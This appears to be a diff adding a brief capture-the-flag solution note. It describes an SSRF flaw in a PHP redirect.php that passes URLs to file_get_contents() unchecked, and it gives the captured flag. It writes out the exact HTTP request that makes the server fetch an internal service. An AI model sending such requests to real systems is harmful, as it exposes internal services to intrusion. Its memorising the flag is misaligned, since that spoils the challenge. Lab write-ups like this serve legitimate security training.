@@ -1,0 +1,4 @@
+# SSRF via redirect.php - access internal service to get flag{f3c6bce7-2360-4fc5-8c7a-0cf38a21d2c1}. PHP file_get_contents() with no URL validation.
+
+GET /redirect.php?url=http://internal-service/ HTTP/1.1
+Host: 172.17.0.1:57991
